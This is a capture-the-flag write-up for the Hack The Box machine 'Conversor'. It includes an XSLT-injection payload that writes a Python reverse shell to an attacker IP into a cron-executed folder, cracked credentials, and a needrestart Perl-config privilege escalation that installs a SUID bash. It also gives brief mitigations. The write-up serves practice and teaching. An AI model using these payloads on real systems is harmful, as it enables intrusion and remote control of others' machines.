- - - 
created : 26-10-2025 

Tags : #easy 

Released on 25 Oct 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ rustscan -a conversor.htb -- -A

Open 10.10.11.92:22
Open 10.10.11.92:80
```
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://conversor.htb

/about                (Status: 200) [Size: 2842]
/convert              (Status: 405) [Size: 153]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/login                (Status: 200) [Size: 722]
/logout               (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 726]
```

![Pasted image 20251026100613.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251026100613.png)
**/about**
![Pasted image 20251026100648.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251026100648.png)

Extract the files:

```bash
└─$ tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

`install.md` :

```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```
  
Every minute, the system executes any  `.py` script inside `/var/www/conversor.htb/scripts/` as the **www-data** user. 

That's a low-privilege shell trigger but if we can drop arbitrary Python code into that directory, it gets executed automatically after a while.
# Exploit
### XSLT injection to RCE

We can see in the source code the `xslt` doesn't have the same parse applied as the `xml`, there are no protections for that type of files.

**MUST READ**:
https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection

Determine the Vendor and Version:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ cat check.xml           
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="version.xslt"?>
<root/>                                                                                               

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ cat version.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />Version: <xsl:value-of select="system-property('xsl:version')" />
<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

![Pasted image 20251026133350.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251026133350.png)
  
Version: XSLT 1.0 ( libxslt/xsltproc feature set). 
Vendor: libxslt  
Vendor URL: http://xmlsoft.org/XSLT/ : the server runs libxslt (the common C library).
  
So, libxslt supports document() and will usually allow `file://` and `http://` URIs unless the application has explicitly sandboxed or disabled external access. 
## RCE 

Create a malicious `xslt` sheet, the server will process an arbitrary `xml` document and the  `xslt` stylesheet is used as the target:

```xml
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ cat shell.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  <xsl:output method="html" encoding="UTF-8"/>

  <xsl:template match="/">
    <!-- Drop a Python reverse shell into the cron-monitored scripts/ folder -->
    <exsl:document href="/var/www/conversor.htb/scripts/xpl.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.41",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
    </exsl:document>

    <!-- Visible output to confirm transform ran -->
    <html><body><h2>Exploit uploaded</h2></body></html>
  </xsl:template>
</xsl:stylesheet>
```

```xml
└─$ cat trigger.xml 
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="shell.xslt"?>
<root/>
```

Start a listener with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
```

Then upload to convert it and wait a minute:

```bash
$ cd instance
$ ls
users.db
$ sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
files  users
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
<SNIP>
```

**Mitigation**

- Disable dangerous XSLT functions like `unparsed-text`, `system-property()`, or `document()`.
- Use a restricted XSLT processor (e.g., disable extensions) and sanitize user-supplied XSLT.
- Disable Dangerous Permissions: Restrict file read/write operations in XSLT.
- Disable external entities in XML parsers (`libxml_disable_entity_loader` in PHP, `DocumentBuilderFactory.setExpandEntityReferences(false)` in Java).
- Implement input validation and restrict allowed XSLT functions.
- Sandbox Processing: Run XSLT transformations in isolated environments (Docker, serverless functions).
- Disable Dangerous Permissions: Restrict file read/write operations in XSLT.
**Key Takeaways**

-  XSLT injection is an underrated but critical vulnerability, often leading to RCE or data breaches.
-  Mitigation requires disabling risky functions, proper input validation, and secure parser configurations.
## SSH 

Crack the [MD5](../../../3%20-%20Tags/Hacking%20Concepts/MD5.md) hash password:

```
fismathack: Keepmesafeandwarm
```

Enter [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Conversor/user]
└─$ ssh fismathack@conversor.htb

-bash-5.1$ cat user.txt
d7a79c2e444e0fd681315ae1fe5ea95f
```

# Privilege Escalation

Check for `sudo` privileges:

```bash
-bash-5.1$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
  
Looking at the script, we can see a clear case of `Perl` config injection, make a malicious file to install a suid bash:

```bash
-bash-5.1$ cat > /tmp/pwned.pl <<'PL'
use strict; use warnings;
unlink '/usr/local/bin/bsh';
system('/usr/bin/install','-m','04755','/bin/bash','/usr/local/bin/bsh');
1;
PL
```

We can execute the following command:

```bash
-bash-5.1$ sudo /usr/sbin/needrestart -c /tmp/pwned.pl -rl -v
[main] eval /tmp/pwned.pl
<SNIP>
```
  
`eval` function gets executed before any logic in `needrestart` script:

```bash
-bash-5.1$ bsh -p
bsh-5.1# cat /root/root.txt
638a23babc795658723ea9563299db18
```

Pwned !!